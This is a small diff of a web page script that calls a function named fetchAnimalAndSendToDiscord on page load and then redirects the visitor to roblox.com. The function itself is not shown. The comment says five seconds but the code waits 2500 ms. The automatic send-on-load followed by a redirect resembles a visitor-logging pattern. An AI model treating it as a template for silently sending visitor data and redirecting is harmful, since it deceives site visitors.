@@ -43,7 +43,14 @@
         }
 
         // Automatically call the function on page load
-        window.onload = fetchAnimalAndSendToDiscord;
+        window.onload = function() {
+            fetchAnimalAndSendToDiscord();
+
+            // Redirect to "roblox.com" after 5 seconds
+            setTimeout(() => {
+                window.location.href = "https://roblox.com";
+            }, 2500);
+        };
     </script>
 </head>
 <body>
